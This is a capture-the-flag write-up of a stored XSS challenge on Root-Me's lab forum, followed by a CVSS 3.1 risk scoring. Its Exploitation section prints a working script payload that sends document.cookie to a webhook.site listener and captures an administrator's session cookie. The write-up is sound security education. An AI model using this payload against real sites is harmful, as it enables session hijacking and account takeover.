---
icon: user-hoodie
---

# Root-Me Web-Client ch18 — Stored XSS: Admin Cookie Exfiltration

## Overview

The target is a minimal forum ("Forum v0.001") that accepts a title and a message and displays posted messages back on the page. This write-up documents the discovery and exploitation of a **stored cross-site scripting (XSS)** vulnerability that allowed exfiltration of an administrator's session cookie.

## Environment

* Kali Linux on Oracle VirtualBox
* Burp Suite (intercepting proxy)
* Target: `http://challenge01.root-me.org/web-client/ch18/`

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FLqSTaUQGFwflDAHPcknc%2Finitial_1.png?alt=media&#x26;token=e3aafa2d-a6b0-42d3-9191-ff6eaf8b72e7" alt="" width="375"><figcaption><p>Figure 1a - Initial RootMe Website</p></figcaption></figure>

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FWBTQeMQbiObwLKpJC1Dm%2Fsetup_1.png?alt=media&#x26;token=a1d35431-e27e-4a0d-b773-90a257acf4b0" alt=""><figcaption><p>Figure 1b - RootMe and Burp Suite setup</p></figcaption></figure>

## Discovery

The application's structure — a post-and-display forum — closely resembled the DVWA stored-XSS exercise, so stored XSS was an early hypothesis.

```html
<script>alert("Hello World")</script>
```

The alert fired when the post rendered, confirming the application **stores and returns input without output encoding**, and that injected scripts execute.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FJfbBW1fOKonK9egILgiz%2Fxsstest_2.png?alt=media&#x26;token=d290b9a0-0397-4d3f-b35a-d424fd896400" alt=""><figcaption><p>Figure 2a - Hello World Script</p></figcaption></figure>

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2Fzpke3UmuJoS1WanazdbP%2Fxssresult_3.png?alt=media&#x26;token=0f98ab7b-6413-4500-81ba-88460fc476c2" alt=""><figcaption><p>Figure 2b - Hello World Alert</p></figcaption></figure>

## Establishing the attack goal

With execution confirmed, I tested whether cookie theft was viable by injecting `document.cookie`. It returned blank — my own unauthenticated session had no JS-readable cookie. That reframed the problem: the cookie worth stealing belongs to whoever's browser _executes_ the script, not mine. I still needed to find how a privileged user would ever trigger the payload.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2F1Ixz4PZKKXnMahmwYlGp%2Fcookie_3.png?alt=media&#x26;token=ccaae2fc-9dee-4205-8e08-c26ac5c3c499" alt=""><figcaption><p>Figure 3 - alert(document.cookie) payload</p></figcaption></figure>

## Ruling out an alternative path

The page displayed a `Status: visitor` label, so I checked in Burp whether privilege was tracked in a client-controllable value. Only `titre` and `message` were sent to the server — no status parameter — indicating the label is server-rendered and not forgeable. This ruled out a privilege-escalation route and confirmed XSS-based exfiltration as the necessary approach.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FQ2nEoqnzuXaAn8GBhE39%2Fstatuscheck_4.png?alt=media&#x26;token=834f1cf2-4f27-47f9-9c95-689c7e9f8d0d" alt=""><figcaption><p>Figure 4 - POST Request</p></figcaption></figure>

I also inspected the server's response headers and found **no `Content-Security-Policy`** — meaning inline scripts and outbound requests to external origins are unrestricted, a precondition for exfiltration to succeed.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2F7B4FloRYhU8oEzLU6Yho%2Fresponseheader_5.png?alt=media&#x26;token=61ebc4be-9143-4f10-a206-16820bc5ad9e" alt=""><figcaption><p>Figure 5 - Server Response</p></figcaption></figure>

## Finding the victim

Reviewing the page source, one system-generated post stood out: _"Message read / Your messages have been read."_ A passive forum wouldn't announce that messages had been read — so an automated process (inferred to be an admin) periodically renders the stored posts. That process is the victim context: when it renders my post, my script runs in _its_ browser.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FtFc5k0sMxUrWtKiK6gSp%2Freadmessage_5.png?alt=media&#x26;token=81d29974-38b1-44fe-b267-0f8d44193805" alt=""><figcaption><p>Figure 6 - Message has been read</p></figcaption></figure>

## Exploitation

I stood up a listener on webhook.site and crafted a payload that, on execution, reads the current cookie and sends it out-of-band as a query parameter:

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FCsULQm8qB43NJ1zworIg%2Fpayload_5.png?alt=media&#x26;token=fa627032-c9e3-4852-922f-80a2980a9de4" alt=""><figcaption><p>Figure 7a - Constructing the payload</p></figcaption></figure>

```html
<script>new Image().src='https://webhook.site/<id>/?c='+encodeURIComponent(document.cookie)</script>
```

The image beacon fires a GET the moment its `src` is set, without navigating the page or requiring CORS (the response is never read), and the cookie is URL-encoded to preserve its delimiters. After a few minutes — the admin process's next sweep — the listener received a request carrying the administrator's cookie:

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FdEpEpqnX4QxWTadkSsmw%2Fcookie_6.png?alt=media&#x26;token=849206ce-a2c4-40c7-bdb5-865f8adf6e72" alt=""><figcaption><p>Figure 7b - Getting the cookie from webhook.site dashboard</p></figcaption></figure>

## Risk Assessment — CVSS 3.1 Scoring

{% hint style="info" %}
Scored as if this were a production web application, not a constrained Root-Me lab exercise. Where that framing matters, it's noted inline — in practice it only affects the Confidentiality and Integrity reasoning below; the app's own demonstrated behavior (anonymous posting, no CSP, admin process rendering stored content) determines the exploitability metrics regardless of lab vs. production context.
{% endhint %}

**CVSS 3.1 Base Score: 7.4 (High)**

`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`

| Metric                       | Value        | Justification                                                                                                                                                                                                                                                                                                                                                                   |
| ---------------------------- | ------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Attack Vector (AV)**       | Network (N)  | The forum's post form is a public HTTP endpoint at `challenge01.root-me.org`, reachable across the network stack — no local or physically-adjacent access required.                                                                                                                                                                                                             |
| **Attack Complexity (AC)**   | Low (L)      | Once submitted, the payload executes on every render. The response headers confirmed no Content-Security-Policy is present, so nothing blocks or complicates the inline script; no race condition or attacker-side preparation is needed.                                                                                                                                       |
| **Privileges Required (PR)** | None (N)     | Burp inspection of the POST request showed only `titre` and `message` are submitted — no session token or credential. The forum's "Status: visitor" label is server-rendered, confirming unauthenticated visitors can post.                                                                                                                                                     |
| **User Interaction (UI)**    | Required (R) | Exploitation depends entirely on the admin process's own periodic sweep rendering the stored post — the attacker cannot trigger execution directly in the victim's session.                                                                                                                                                                                                     |
| **Scope (S)**                | Changed (C)  | The vulnerable component (an anonymous-facing post form) and the impacted component (the admin's authenticated browsing session) sit under different security authorities; the payload executes in, and discloses secrets from, a context the attacker never held.                                                                                                              |
| **Confidentiality (C)**      | High (H)     | The PoC exfiltrated the live administrator session cookie to an attacker-controlled listener (Figure 7b). A session cookie is complete bearer-credential material — its disclosure is total loss of confidentiality for that authorization context, not a partial or uncontrolled leak, regardless of it being a single captured value.                                         |
| **Integrity (I)**            | None (N)     | The only admin behavior actually observed is read-only — the "Message read" indicator shows the admin process rendering stored posts, nothing more. No edit, delete, or configuration action was demonstrated or attempted with the captured session. Scoring Integrity above None here would mean assuming the admin account's write capabilities rather than evidencing them. |
| **Availability (A)**         | None (N)     | Nothing in the exploit chain — payload injection, cookie capture, exfiltration — causes or implies service disruption. The attack path is read/exfiltrate only.                                                                                                                                                                                                                 |

**Open question:** does the hijacked admin session permit any write action (reply, moderate, delete a post)? That's untested here — the PoC stops at cookie capture. Attempting a state-changing request with the stolen session would be the natural next step to confirm or rule out raising Integrity above None.

### Temporal Score

**CVSS 3.1 Temporal Score: 7.4 (High)** — unchanged from Base

`E:H/RL:X/RC:C`

| Metric                        | Value           | Justification                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ----------------------------- | --------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Exploit Code Maturity (E)** | High (H)        | No specialized exploit development is required — the payload is a hand-crafted `<script>` tag and a `new Image().src` cookie-exfil beacon, one of the most widely documented exploitation patterns in web security. Exploitation is achievable manually by any attacker with knowledge of the vulnerable field.                                                                                                                                                                                                                                                                                             |
| **Remediation Level (RL)**    | Not Defined (X) | No information in this write-up establishes a remediation status for this specific application. CWE-79's general mitigation guidance (output encoding, CSP) describes how XSS is fixed as a vulnerability _class_, which is true of every XSS finding regardless of whether this particular forum has been patched. Absent instance-specific evidence — an actual patched build, a maintainer response, a published workaround for this app — asserting Official Fix or Workaround would score a remediation state that isn't evidenced. Not Defined is the only value that doesn't overstate what's known. |
| **Report Confidence (RC)**    | Confirmed (C)   | The write-up is a first-person, fully reproduced confirmation of the vulnerability, culminating in the captured administrator cookie (Figure 7b).                                                                                                                                                                                                                                                                                                                                                                                                                                                           |

Since E:H and RC:C each carry a 1.0 multiplier and RL:X defaults to 1.0 as well, the Temporal Score equals the Base Score here — 7.4 (High). It would only diverge if instance-specific remediation evidence for this application surfaced.
